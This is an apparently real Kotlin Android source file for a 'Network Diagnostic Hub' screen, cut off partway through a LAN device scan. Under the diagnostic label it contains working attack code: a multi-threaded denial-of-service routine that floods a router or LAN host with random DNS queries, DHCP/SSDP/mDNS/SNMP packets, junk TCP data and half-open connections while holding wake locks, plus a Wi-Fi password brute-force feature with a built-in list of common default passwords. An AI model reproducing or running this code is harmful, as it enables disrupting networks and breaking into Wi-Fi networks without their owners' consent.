package com.droid.dolphy.network

import com.droid.dolphy.DolphyIconButton

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.SupplicantState
import android.net.wifi.WifiManager
import android.net.wifi.WifiNetworkSuggestion
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.heightIn
import androidx.compose.foundation.layout.navigationBarsPadding
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.itemsIndexed
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.Add
import androidx.compose.material.icons.filled.Build
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.ChevronRight
import androidx.compose.material.icons.filled.Close
import androidx.compose.material.icons.filled.VpnKey
import androidx.compose.material.icons.filled.Delete
import androidx.compose.material.icons.filled.Wifi
import androidx.compose.material.icons.filled.FlashOn
import androidx.compose.material.icons.filled.SettingsEthernet
import androidx.compose.material.icons.filled.Shield
import androidx.compose.material.icons.filled.WifiOff
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.Checkbox
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.FilledTonalButton
import androidx.compose.material3.SwipeToDismissBox
import androidx.compose.material3.SwipeToDismissBoxValue
import androidx.compose.material3.rememberSwipeToDismissBoxState
import androidx.compose.ui.draw.clip
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import com.droid.dolphy.AppLocale
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalHapticFeedback
import androidx.compose.ui.viewinterop.AndroidView
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import androidx.navigation.NavController
import com.droid.dolphy.M3SegmentedListItem
import com.droid.dolphy.M3SegmentedListItemSpacing
import com.droid.dolphy.MaterialBackground
import com.droid.dolphy.MaterialCard
import com.droid.dolphy.R
import com.droid.dolphy.SectionTopBar
import com.droid.dolphy.SignalRow
import com.droid.dolphy.TextGray
import com.droid.dolphy.m3SegmentedItems
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.BufferedReader
import java.io.FileReader
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.HttpURLConnection
import java.net.InetAddress
import java.net.NetworkInterface
import java.net.Socket
import java.net.InetSocketAddress
import java.net.URL
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.nio.channels.SocketChannel
import java.text.SimpleDateFormat
import java.util.Collections
import java.util.Date
import java.util.Locale
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.coroutines.yield

private data class HubWifiNetwork(
    val ssid: String,
    val bssid: String?,
    val level: Int,
    val frequencyMhz: Int,
    val capabilities: String?,
    val isActive: Boolean,
)

private enum class HubDialogStage {
    Menu,
    Countdown,
    WaitingConnection,
    Started,
    BruteForce,
    Error,
    AdminPanel,
    SelectDevice,
}

private data class HubLanHost(
    val ip: String,
    val title: String,
    val subtitle: String = "",
    val isGateway: Boolean = false,
    val isSelf: Boolean = false,
)

private const val STOCK_GROUP_NAME = "Mật khẩu mặc định (Default)"

@Serializable
private data class PasswordGroupDto(
    val name: String,
    val passwords: List<String>,
    val selected: Boolean
)

private class PasswordGroup(val name: String) {
    var selected by mutableStateOf(true)
    val passwords = mutableListOf<String>()
    val isImported: Boolean get() = name != STOCK_GROUP_NAME

    fun allPasswords(): List<String> = passwords.toList()
}

private fun getFileName(context: android.content.Context, uri: android.net.Uri): String {
    var name = "Imported"
    val cursor = context.contentResolver.query(uri, null, null, null, null)
    cursor?.use {
        if (it.moveToFirst()) {
            val idx = it.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME)
            if (idx >= 0) name = it.getString(idx) ?: "Imported"
        }
    }
    return name.substringBeforeLast(".").ifBlank { "Imported" }
}

@Composable
fun NetworkDiagnosticHubScreen(navController: NavController) {
    val context = LocalContext.current
    val haptics = LocalHapticFeedback.current
    val lifecycleOwner = LocalLifecycleOwner.current
    val wifiManager = remember {
        context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
    }
    val connectivityManager = remember {
        context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    }
    val scope = rememberCoroutineScope()

    fun requiredWifiPermissions(): Array<String> {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.NEARBY_WIFI_DEVICES,
                Manifest.permission.CHANGE_WIFI_STATE
            )
        } else {
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CHANGE_WIFI_STATE
            )
        }
    }

    fun hasWifiPermissions(): Boolean {
        return requiredWifiPermissions().all { permission ->
            ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    var wifiPermissionsGranted by remember { mutableStateOf(hasWifiPermissions()) }
    val locationManager = remember {
        context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
    }

    fun isLocationServicesEnabled(): Boolean {
        val lm = locationManager ?: return false
        return lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
            lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
    }

    var locationServicesEnabled by remember { mutableStateOf(isLocationServicesEnabled()) }
    var showLocationServicesDialog by remember { mutableStateOf(false) }
    val wifiPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) {
        wifiPermissionsGranted = hasWifiPermissions()
        locationServicesEnabled = isLocationServicesEnabled()
    }


    LaunchedEffect(Unit) {
        if (!hasWifiPermissions()) {
            wifiPermissionLauncher.launch(requiredWifiPermissions())
        } else if (!locationServicesEnabled) {
            showLocationServicesDialog = true
        }
    }

    val networks = remember { mutableStateListOf<HubWifiNetwork>() }
    var dialogNetwork by remember { mutableStateOf<HubWifiNetwork?>(null) }
    var dialogStage by remember { mutableStateOf<HubDialogStage?>(null) }
    var countdown by remember { mutableIntStateOf(3) }
    var launchedWifiSettings by remember { mutableStateOf(false) }
    var udpSendJob by remember { mutableStateOf<kotlinx.coroutines.Job?>(null) }
    var bruteForceJob by remember { mutableStateOf<kotlinx.coroutines.Job?>(null) }
    val sendLogs = remember { mutableStateListOf<String>() }

    var bruteForceSuccess by remember { mutableStateOf(false) }
    var foundPassword by remember { mutableStateOf("") }

    var currentBrutePassword by remember { mutableStateOf("") }
    var showPasswordDialog by remember { mutableStateOf(false) }
    val lanHosts = remember { mutableStateListOf<HubLanHost>() }
    var lanScanning by remember { mutableStateOf(false) }
    var lanScanJob by remember { mutableStateOf<Job?>(null) }
    var selectedTargetLabel by remember { mutableStateOf("") }

    val prefs = remember { context.getSharedPreferences("wifi_passwords", Context.MODE_PRIVATE) }

    fun saveGroups(groups: List<PasswordGroup>) {
        val dtos = groups.map { PasswordGroupDto(it.name, it.passwords, it.selected) }
        try {
            val json = Json.encodeToString(dtos)
            prefs.edit().putString("groups", json).apply()
        } catch (e: Exception) {

        }
    }

    fun loadGroups(): List<PasswordGroup> {
        val json = prefs.getString("groups", null) ?: return emptyList()
        return try {
            val dtos = Json.decodeFromString<List<PasswordGroupDto>>(json)
            dtos.map { dto ->
                PasswordGroup(dto.name).apply {
                    passwords.addAll(dto.passwords)
                    selected = dto.selected
                }
            }
        } catch (e: Exception) {
            emptyList()
        }
    }

    val defaultPasswords = listOf(
        "12345678", "YJFJTGM2", "11111111", "00000000", "22222222", "33333333", "44444444", "55555555",
        "66666666", "77777777", "88888888", "99999999", "qwertyui", "qwertzui", "qwertyuiop", "asdfghjk",
        "password", "adminadmin", "87654321", "12344321", "00001111", "12312312", "11223344", "1234567890",
        "netgear1", "linksys1", "dlink123", "tplink123", "admin123", "rootroot", "guest123",
        "qwerty123", "12345qwerty", "admin", "root", "12345", "123456", "1234567",
        "freewifi", "free_wifi", "freewifi123", "internet", "guestwifi", "publicwifi", "welcome",
        "welcome123", "login123", "wifi1234", "accesspoint", "hotspot123", "openwifi", "starbucks",
        "mcdonalds", "public_wifi", "internet123", "home_wifi", "my_wifi", "secure_wifi", "w12345678i", "12346789"
    ).distinct()

    val passwordGroups = remember {
        val loaded = loadGroups()
        if (loaded.isNotEmpty()) {
            mutableStateListOf<PasswordGroup>().apply { addAll(loaded) }
        } else {
            mutableStateListOf<PasswordGroup>().apply {
                add(PasswordGroup(STOCK_GROUP_NAME).apply {
                    passwords.addAll(defaultPasswords)
                })
            }
        }
    }

    fun appendLog(message: String) {
        val stamp = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        sendLogs += "[$stamp] $message"
    }

    val fileImportLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetContent()
    ) { uri ->
        if (uri != null) {
            try {
                val groupName = getFileName(context, uri)
                val inputStream = context.contentResolver.openInputStream(uri)
                val text = inputStream?.bufferedReader()?.readText() ?: ""
                inputStream?.close()
                val imported = text.split("\\s+".toRegex())
                    .map { it.trim() }
                    .filter { it.isNotBlank() }
                    .distinct()
                if (imported.isNotEmpty()) {
                    val group = PasswordGroup(groupName)
                    group.passwords.addAll(imported)
                    passwordGroups.add(group)
                    saveGroups(passwordGroups)
                }
            } catch (e: Exception) {
                appendLog("Import error: ${e.message}")
            }
        }
    }

    fun getGatewayIpAddress(context: Context): String? {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val dhcpInfo = wifiManager.dhcpInfo
            dhcpIntToIpv4(dhcpInfo.gateway)
        } catch (e: Exception) {
            null
        }
    }

    
    fun getDhcpDnsServers(context: Context): List<String> {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val dhcp = wifiManager.dhcpInfo
            listOfNotNull(dhcpIntToIpv4(dhcp.dns1), dhcpIntToIpv4(dhcp.dns2)).distinct()
        } catch (_: Exception) {
            emptyList()
        }
    }

    fun currentSsid(): String? {
        val raw = runCatching { wifiManager.connectionInfo?.ssid }.getOrNull() ?: return null
        val normalized = raw.trim().trim('"')
        return normalized.takeIf { it.isNotBlank() && !it.equals("unknown ssid", ignoreCase = true) }
    }

    fun refreshNetworks() {
        if (!wifiPermissionsGranted || !locationServicesEnabled) {
            networks.clear()
            return
        }

        runCatching { wifiManager.startScan() }
        val activeSsid = currentSsid()
        val refreshed = runCatching { wifiManager.scanResults.orEmpty() }
            .getOrElse { emptyList() }
            .mapNotNull { scan ->
                val ssid = scan.SSID?.trim().orEmpty()
                if (ssid.isBlank()) null else HubWifiNetwork(
                    ssid = ssid,
                    bssid = scan.BSSID,
                    level = scan.level,
                    frequencyMhz = scan.frequency,
                    capabilities = scan.capabilities,
                    isActive = activeSsid == ssid,
                )
            }
            .distinctBy { it.ssid to it.bssid }
            .sortedWith(
                compareByDescending<HubWifiNetwork> { it.isActive }
                    .thenByDescending { it.level }
                    .thenBy { it.ssid.lowercase() }
            )

        networks.clear()
        networks.addAll(refreshed)
    }

    fun startContinuousUdpTest(targetSsid: String, targetIp: String? = null): Job {
        appendLog(context.getString(R.string.network_hub_log_connected, targetSsid))
        val gateway = getGatewayIpAddress(context)
        val dhcpDns = getDhcpDnsServers(context)
        val primaryIp = targetIp?.trim()?.takeIf { it.isNotBlank() }
            ?: gateway
            ?: "255.255.255.255"
        val isHostTarget = !targetIp.isNullOrBlank()
        val isRouterMode = !isHostTarget || primaryIp == gateway
        val isVi = AppLocale.isVietnamese(context)
        if (isHostTarget && !isRouterMode) {
            appendLog(if (isVi) "Chuẩn bị kiểm thử L3/L4 nội bộ → $primaryIp" else "Preparing local L3/L4 test → $primaryIp")
            appendLog(if (isVi) "Chế độ: Thiết bị LAN + DNS nội bộ" else "Mode: LAN Device + Local DNS")
        } else {
            appendLog(context.getString(R.string.network_hub_log_prepare))
            appendLog(if (isVi) "Chế độ: Router nội bộ (Offline-Safe, không kết nối WAN ngoài)" else "Mode: Local Router (Offline-Safe, no external WAN)")
        }
        if (selectedTargetLabel.isNotBlank()) {
            appendLog(if (isVi) "Mục tiêu: $selectedTargetLabel" else "Target: $selectedTargetLabel")
        }
        if (dhcpDns.isNotEmpty()) {
            appendLog("DHCP DNS: ${dhcpDns.joinToString()}")
        }

        val wakeLock = runCatching {
            (context.getSystemService(Context.POWER_SERVICE) as PowerManager)
                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Dolphy:netflood")
                .apply { acquire(30 * 60 * 1000L) }
        }.getOrNull()
        val wifiLock = runCatching {
            wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "Dolphy:netflood")
                .apply { acquire() }
        }.getOrNull()
        if (wakeLock != null || wifiLock != null) {
            appendLog(if (isVi) "Giữ kết nối Wi-Fi: WakeLock/WifiLock đang bật" else "Radio lock: WakeLock/WifiLock active")
        }

        val job = scope.launch(Dispatchers.IO) {
            val packetCount = AtomicLong(0)
            val byteCount = AtomicLong(0)
            val primaryAddr = runCatching { InetAddress.getByName(primaryIp) }.getOrNull()
            if (primaryAddr == null) {
                withContext(Dispatchers.Main) {
                    appendLog(if (isVi) "Không thể phân giải địa chỉ $primaryIp" else "Failed to resolve $primaryIp")
                }
                return@launch
            }
            val gatewayAddr = gateway?.let { runCatching { InetAddress.getByName(it) }.getOrNull() }
            val broadcastAddr = runCatching { InetAddress.getByName("255.255.255.255") }.getOrNull()
            val ssdpAddr = runCatching { InetAddress.getByName("239.255.255.250") }.getOrNull()
            val mdnsAddr = runCatching { InetAddress.getByName("224.0.0.251") }.getOrNull()

            val dnsTargets = linkedSetOf<InetAddress>()
            gatewayAddr?.let { dnsTargets += it }
            dhcpDns.forEach { ip ->
                runCatching { InetAddress.getByName(ip) }.getOrNull()?.let { dnsTargets += it }
            }
            if (isHostTarget) dnsTargets += primaryAddr
            if (dnsTargets.isEmpty()) dnsTargets += primaryAddr
            val dnsList = dnsTargets.toList()

            // Offline-Safe: Restricted strictly to local LAN / Gateway addresses (no external WAN servers)
            val externalHosts = dnsList
            val externalPorts = intArrayOf(53, 80, 443, 8080, 8443)

            withContext(Dispatchers.Main) {
                appendLog(context.getString(R.string.network_hub_log_target, primaryIp))
                appendLog("Local targets: ${dnsList.joinToString { it.hostAddress ?: "?" }}")
                appendLog(if (isVi) "Kiểm thử tải nội bộ LAN · SSDP/mDNS/SNMP" else "Local LAN load · SSDP/mDNS/SNMP")
            }

            val localUdpPorts = intArrayOf(53, 67, 68, 123, 1900, 5353, 161, 137, 138)
            val localTcpPorts = intArrayOf(53, 80, 443, 8080, 8443, 22, 23, 445, 8081, 8888)
            val httpPaths = listOf("/", "/generate_204", "/hotspot-detect.html", "/ncsi.txt", "/favicon.ico", "/cgi-bin/")
            val junk = ByteArray(1400) { (it * 31 + 7).toByte() }
            val dhcpDiscover = buildDhcpDiscover()

            val dnsWorkers = (1..32).map { workerId ->
                launch {
                    val random = java.util.Random(workerId.toLong() xor System.nanoTime())
                    val sockets = (1..3).map {
                        runCatching {
                            DatagramSocket().apply {
                                sendBufferSize = 512 * 1024
                                soTimeout = 1
                                reuseAddress = true
                                broadcast = true
                            }
                        }.getOrNull()
                    }.filterNotNull()
                    if (sockets.isEmpty()) return@launch
                    val templates = Array(8) { buildRandomRecursiveDnsQuery(random) }
                    try {
                        var i = 0
                        while (isActive) {
                            val q = templates[random.nextInt(templates.size)]
                            q[0] = random.nextInt(256).toByte()
                            q[1] = random.nextInt(256).toByte()
                            val dest = dnsList[random.nextInt(dnsList.size)]
                            runCatching {
                                sockets[i % sockets.size].send(DatagramPacket(q, q.size, dest, 53))
                                packetCount.incrementAndGet()
                                byteCount.addAndGet(q.size.toLong())
                            }
                            repeat(3) {
                                val q2 = templates[random.nextInt(templates.size)]
                                q2[0] = random.nextInt(256).toByte()
                                q2[1] = random.nextInt(256).toByte()
                                val d2 = dnsList[random.nextInt(dnsList.size)]
                                runCatching {
                                    sockets[(i + it) % sockets.size].send(DatagramPacket(q2, q2.size, d2, 53))
                                    packetCount.incrementAndGet()
                                    byteCount.addAndGet(q2.size.toLong())
                                }
                            }
                            if ((i and 31) == 0) {
                                runCatching {
                                    Socket().use { s ->
                                        s.tcpNoDelay = true
                                        s.soTimeout = 60
                                        s.connect(InetSocketAddress(dest, 53), 60)
                                        val len = ByteBuffer.allocate(2).order(ByteOrder.BIG_ENDIAN)
                                            .putShort(q.size.toShort()).array()
                                        val out = s.getOutputStream()
                                        out.write(len)
                                        out.write(q)
                                        out.flush()
                                    }
                                    packetCount.incrementAndGet()
                                }
                            }
                            i++
                            if ((i and 127) == 0) yield()
                        }
                    } finally {
                        sockets.forEach { runCatching { it.close() } }
                    }
                }
            }

            val udpServiceWorkers = (1..12).map { workerId ->
                launch {
                    val random = java.util.Random(workerId + 7000L)
                    val socket = runCatching {
                        DatagramSocket().apply {
                            broadcast = true
                            sendBufferSize = 256 * 1024
                            soTimeout = 1
                            reuseAddress = true
                        }
                    }.getOrNull() ?: return@launch
                    try {
                        var i = 0
                        while (isActive) {
                            val port = localUdpPorts[random.nextInt(localUdpPorts.size)]
                            val dest = when (port) {
                                67, 68 -> broadcastAddr ?: primaryAddr
                                1900 -> ssdpAddr ?: broadcastAddr ?: primaryAddr
                                5353 -> mdnsAddr ?: broadcastAddr ?: primaryAddr
                                else -> primaryAddr
                            }
                            val payload = when (port) {
                                67, 68 -> dhcpDiscover
                                53 -> buildRandomRecursiveDnsQuery(random)
                                1900 -> buildSsdpMsearch(if ((i and 1) == 0) "ssdp:all" else "upnp:rootdevice")
                                5353 -> buildMdnsServiceQuery(random.nextInt(0x10000))
                                161 -> buildSnmpGetNext(random.nextInt())
                                else -> junk
                            }
                            val len = if (port == 67 || port == 68) payload.size else minOf(payload.size, 512 + random.nextInt(800))
                            runCatching {
                                socket.send(DatagramPacket(payload, len, dest, port))
                                packetCount.incrementAndGet()
                                byteCount.addAndGet(len.toLong())
                            }
                            if (gatewayAddr != null && (i and 1) == 0) {
                                val q = buildRandomRecursiveDnsQuery(random)
                                runCatching {
                                    socket.send(DatagramPacket(q, q.size, gatewayAddr, 53))
                                    packetCount.incrementAndGet()
                                }
                            }
                            i++
                            if ((i and 127) == 0) yield()
                        }
                    } finally {
                        runCatching { socket.close() }
                    }
                }
            }

            val natWorkers = (1..if (isRouterMode) 28 else 12).map { workerId ->
                launch {
                    val random = java.util.Random(workerId + 9000L)
                    val held = ArrayDeque<Socket>(64)
                    try {
                        while (isActive) {
                            if (held.size > 48) {
                                runCatching { held.removeFirst().close() }
                                releaseFd()
                            }
                            val host = if (externalHosts.isNotEmpty()) {
                                externalHosts[random.nextInt(externalHosts.size)]
                            } else {
                                primaryAddr
                            }
                            val port = externalPorts[random.nextInt(externalPorts.size)]
                            runCatching {
                                val s = Socket()
                                s.tcpNoDelay = true
                                s.soTimeout = 120
                                s.connect(InetSocketAddress(host, port), 150)
                                val out = s.getOutputStream()
                                when (port) {
                                    80, 8080 -> {
                                        out.write(
                                            ("GET / HTTP/1.1\r\nHost: ${host.hostAddress}\r\n" +
                                                "Connection: keep-alive\r\n\r\n").toByteArray(),
                                        )
                                        out.flush()
                                        if (random.nextBoolean() && tryAcquireFd()) {
                                            held.addLast(s)
                                        } else {
                                            s.close()
                                        }
                                    }
                                    443, 8443, 853 -> {
                                        out.write(junk, 0, 200)
                                        out.flush()
                                        if (random.nextInt(3) == 0 && tryAcquireFd()) held.addLast(s) else s.close()
                                    }
                                    else -> {
                                        out.write(junk, 0, 64)
                                        out.flush()
                                        s.close()
                                    }
                                }
                                packetCount.incrementAndGet()
                            }
                        }
                    } finally {
                        held.forEach {
                            runCatching { it.close() }
                            releaseFd()
                        }
                        held.clear()
                    }
                }
            }

            val tcpConnectWorkers = (1..4).map { workerId ->
                launch {
                    val random = java.util.Random(workerId + 3000L)
                    while (isActive) {
                        val port = localTcpPorts[random.nextInt(localTcpPorts.size)]
                        runCatching {
                            Socket().use { socket ->
                                socket.tcpNoDelay = true
                                socket.soTimeout = 80
                                socket.connect(InetSocketAddress(primaryAddr, port), 100)
                                val out = socket.getOutputStream()
                                if (port == 80 || port == 8080 || port == 8008 || port == 8888) {
                                    val path = httpPaths[random.nextInt(httpPaths.size)]
                                    out.write(
                                        ("GET $path HTTP/1.1\r\nHost: $primaryIp\r\n" +
                                            "Connection: close\r\n\r\n").toByteArray(),
                                    )
                                } else if (port == 443 || port == 8443) {
                                    out.write(junk, 0, 200)
                                } else {
                                    out.write(junk, 0, 128)
                                }
                                out.flush()
                            }
                        }
                        packetCount.incrementAndGet()
                    }
                }
            }

            val halfOpenWorkers = (1..if (isRouterMode) 10 else 18).map { workerId ->
                launch {
                    val random = java.util.Random(workerId + 30000L)
                    val pending = HashMap<SocketChannel, Long>()
                    try {
                        while (isActive) {
                            val now = System.currentTimeMillis()
                            val it = pending.entries.iterator()
                            while (it.hasNext()) {
                                val (ch, deadline) = it.next()
                                val done = runCatching { ch.finishConnect() }.getOrDefault(false)
                                if (done || now >= deadline) {
                                    runCatching { ch.close() }
                                    releaseFd()
                                    it.remove()
                                }
                            }
                            if (pending.size < 64 && tryAcquireFd()) {
                                val port = localTcpPorts[random.nextInt(localTcpPorts.size)]
                                val ch = runCatching {
                                    SocketChannel.open().apply { configureBlocking(false) }
                                }.getOrNull()
                                if (ch != null && runCatching { ch.connect(InetSocketAddress(primaryAddr, port)) }.isSuccess) {
                                    pending[ch] = now + 5000
                                    packetCount.incrementAndGet()
                                } else {
                                    runCatching { ch?.close() }
                                    releaseFd()
                                }
                            } else if (pending.isEmpty()) {
                                delay(2)
                            }
                            if ((packetCount.get() and 511) == 0L) yield()
                        }
                    } finally {
                        pending.keys.forEach {
                            runCatching { it.close() }
                            releaseFd()
                        }
                        pending.clear()
                    }
                }
            }

            val bwWorkers = emptyList<Job>()

            launch {
                var lastPkts = 0L
                var lastBytes = 0L
                var lastTs = System.currentTimeMillis()
                while (isActive) {
                    delay(500)
                    val now = System.currentTimeMillis()
                    val pkts = packetCount.get()
                    val bytes = byteCount.get()
                    val dt = (now - lastTs).coerceAtLeast(1)
                    val pps = ((pkts - lastPkts) * 1000L) / dt
                    val mbps = ((bytes - lastBytes) * 8.0 / dt / 1000.0)
                    lastPkts = pkts
                    lastBytes = bytes
                    lastTs = now
                    withContext(Dispatchers.Main) {
                        appendLog(
                            "flood: $pkts ops · ${pps}/s · ${"%.1f".format(Locale.US, mbps)} Mbps",
                        )
                    }
                }
            }

            (dnsWorkers + udpServiceWorkers + natWorkers + tcpConnectWorkers + halfOpenWorkers + bwWorkers)
                .forEach { it.join() }
        }
        job.invokeOnCompletion {
            runCatching { wakeLock?.takeIf { it.isHeld }?.release() }
            runCatching { wifiLock?.takeIf { it.isHeld }?.release() }
        }
        return job
    }

    fun startLanDeviceScan() {
        lanScanJob?.cancel()
        lanHosts.clear()
        lanScanning = true
        lanScanJob = scope.launch(Dispatchers.IO) {
            val hosts = ConcurrentHashMap<String, HubLanHost>()
            val gateway = getGatewayIpAddress(context)
            val self = getAccurateWifiIpv4(context) ?: getHubLocalIpv4()
            val dhcpDns = getDhcpDnsServers(context)
            val isVi = AppLocale.isVietnamese(context)

            // Prioritize gateway subnet so 4G LTE (rmnet/ccmni) never hijacks Wi-Fi LAN scan!
            val subnet = gateway?.substringBeforeLast('.') ?: self?.substringBeforeLast('.')
            val effectiveGateway = gateway ?: subnet?.let { "$it.1" }

            if (effectiveGateway != null) {
                hosts[effectiveGateway] = HubLanHost(
                    ip = effectiveGateway,
                    title = if (isVi) "Gateway / Router chính" else "Gateway / Router",
                    subtitle = "DNS · DHCP · LAN",
                    isGateway = true,
                )
            }
            withContext(Dispatchers.Main) {
                lanHosts.clear()
                lanHosts.addAll(hosts.values.sortedWith(compareByDescending<HubLanHost> { it.isGateway }.thenBy { it.ip }))
            }

            if (subnet == null) {
                withContext(Dispatchers.Main) { lanScanning = false }
                return@launch
            }

            // 1. Fast UDP ARP-Warmup burst to wake up sleeping phones & populate kernel neighbor table
            launch { warmupSubnetArpTable(subnet) }

            // 2. Background SSDP UPnP M-SEARCH + Multi-Listener NsdManager mDNS discovery
            val upnpMap = ConcurrentHashMap<String, Pair<String?, String?>>()
            val nsdMap = ConcurrentHashMap<String, String>()

            val ssdpJob = launch {
                try {
                    val ssdpReq = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
                    DatagramSocket().use { sock ->
                        sock.soTimeout = 1400
                        val group = InetAddress.getByName("239.255.255.250")
                        sock.send(DatagramPacket(ssdpReq.toByteArray(), ssdpReq.length, group, 1900))
                        val buf = ByteArray(1536)
                        val t0 = System.currentTimeMillis()
                        while (System.currentTimeMillis() - t0 < 1800) {
                            try {
                                val pkt = DatagramPacket(buf, buf.size)
                                sock.receive(pkt)
                                val resp = String(pkt.data, 0, pkt.length)
                                val addr = pkt.address?.hostAddress
                                if (addr != null) {
                                    val loc = Regex("(?im)^LOCATION:\\s*(.+)$").find(resp)?.groupValues?.get(1)?.trim()
                                    val srv = Regex("(?im)^SERVER:\\s*(.+)$").find(resp)?.groupValues?.get(1)?.trim()
                                    if (loc != null || srv != null) upnpMap[addr] = loc to srv
                                }
                            } catch (_: Exception) { break }
                        }
                    }
                } catch (_: Exception) {}
            }

            val ndm = context.getSystemService(Context.NSD_SERVICE) as? android.net.nsd.NsdManager
            val nsdListeners = mutableListOf<android.net.nsd.NsdManager.DiscoveryListener>()
            if (ndm != null) {
                val svcTypes = listOf("_airplay._tcp.", "_companion-link._tcp.", "_googlecast._tcp.", "_smb._tcp.", "_http._tcp.", "_printer._tcp.")
                for (st in svcTypes) {
                    try {
                        val l = object : android.net.nsd.NsdManager.DiscoveryListener {
                            override fun onDiscoveryStarted(regType: String) {}
                            override fun onServiceFound(si: android.net.nsd.NsdServiceInfo) {
                                try {
                                    ndm.resolveService(si, object : android.net.nsd.NsdManager.ResolveListener {
                                        override fun onResolveFailed(s: android.net.nsd.NsdServiceInfo?, err: Int) {}
                                        override fun onServiceResolved(s: android.net.nsd.NsdServiceInfo) {
                                            val h = s.host?.hostAddress
                                            val n = s.serviceName?.trim()
                                            if (h != null && !n.isNullOrBlank()) nsdMap[h] = n
                                        }
                                    })
                                } catch (_: Exception) {}
                            }
                            override fun onServiceLost(si: android.net.nsd.NsdServiceInfo) {}
                            override fun onDiscoveryStopped(serviceType: String) {}
                            override fun onStartDiscoveryFailed(serviceType: String, errorCode: Int) {}
                            override fun onStopDiscoveryFailed(serviceType: String, errorCode: Int) {}
                        }
                        ndm.discoverServices(st, android.net.nsd.NsdManager.PROTOCOL_DNS_SD, l)
                        nsdListeners.add(l)
                    } catch (_: Exception) {}
                }
            }

            delay(350)
            val neighborMap = ConcurrentHashMap(readSystemNeighborTable())

            fun buildHostItem(dev: LanDevice, isGw: Boolean): HubLanHost {
                val bestTitle = if (isGw) {
                    val gwBrand = dev.brand ?: dev.hostname?.takeIf { !it.startsWith("Router") }
                    if (!gwBrand.isNullOrBlank()) {
                        if (isVi) "Gateway / Router chính ($gwBrand)" else "Gateway / Router ($gwBrand)"
                    } else {
                        if (isVi) "Gateway / Router chính" else "Gateway / Router"
                    }
                } else {
                    dev.customAlias ?: dev.hostname ?: dev.brand ?: dev.ip
                }
                val subParts = mutableListOf<String>()
